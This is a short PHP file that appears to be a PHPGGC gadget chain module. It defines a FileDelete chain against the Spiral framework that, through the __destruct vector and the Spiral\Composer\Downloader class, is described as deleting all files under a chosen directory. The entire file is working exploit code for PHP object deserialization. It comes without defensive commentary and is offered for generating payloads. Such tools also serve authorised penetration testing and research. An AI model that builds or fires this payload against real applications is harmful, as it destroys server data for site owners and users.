<?php

class FD2 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '2.8.0';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';
    public static $information = 'delete all files under given dir';

    public function generate(array $parameters)
    {
        return new \Spiral\Composer\Downloader($parameters['remote_path']);
    }
}
